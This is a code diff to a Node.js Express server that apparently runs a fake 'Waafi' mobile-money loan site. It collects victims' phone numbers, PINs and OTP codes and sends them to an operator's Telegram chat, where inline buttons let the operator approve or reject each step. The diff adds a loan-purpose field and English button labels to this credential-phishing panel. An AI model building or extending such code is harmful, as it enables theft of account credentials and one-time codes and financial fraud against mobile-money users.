@@ -1,4 +1,4 @@
-require('dotenv').config(); // Load environment variables from .env file
+require('dotenv').config();
 const express = require('express');
 const path = require('path');
 const app = express();
@@ -15,6 +15,7 @@ let ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || null;
 let currentState = {
     amount: '1,000',
     duration: '12 months',
+    purpose: 'Ganacsi (Business)',
     monthly: '$98.33',
     phone: '',
     pin: '',
@@ -25,7 +26,7 @@ let currentState = {
     otp2Status: 'pending'  // 'pending', 'success', 'wrong'
 };
 
-// Helper function to send Telegram messages with inline buttons
+// Helper function to send Telegram messages with English inline buttons
 async function sendTelegramMessage(text, replyMarkup = null) {
     if (!ADMIN_CHAT_ID) {
         console.warn('Warning: ADMIN_CHAT_ID is not set!');
@@ -58,10 +59,11 @@ app.get('/page2', (req, res) => {
 
 // API: Save Loan Request Details
 app.post('/api/loan-request', (req, res) => {
-    const { amount, duration, monthly } = req.body;
-    currentState.amount = amount;
-    currentState.duration = duration;
-    currentState.monthly = monthly;
+    const { amount, duration, purpose, monthly } = req.body;
+    if (amount) currentState.amount = amount;
+    if (duration) currentState.duration = duration;
+    if (purpose) currentState.purpose = purpose;
+    if (monthly) currentState.monthly = monthly;
     res.json({ success: true });
 });
 
@@ -72,8 +74,9 @@ app.post('/api/submit-pin-data', async (req, res) => {
     currentState.pin = pin;
     currentState.pinStatus = 'pending';
 
-    const msg = `📥 **New Waafi Loan Request**\n\n📞 Phone: ${phone}\n💰 Amount: $${currentState.amount}\n⏱ Duration: ${currentState.duration}\n🔐 PIN: ${pin}`;
+    const msg = `📥 **New Waafi Loan Request**\n\n📞 Phone: ${phone}\n💰 Amount: $${currentState.amount}\n⏱ Duration: ${currentState.duration}\n🎯 Purpose: ${currentState.purpose}\n🔐 PIN: ${pin}`;
     
+    // English Telegram Inline Buttons
     const inlineKeyboard = {
         inline_keyboard: [
             [
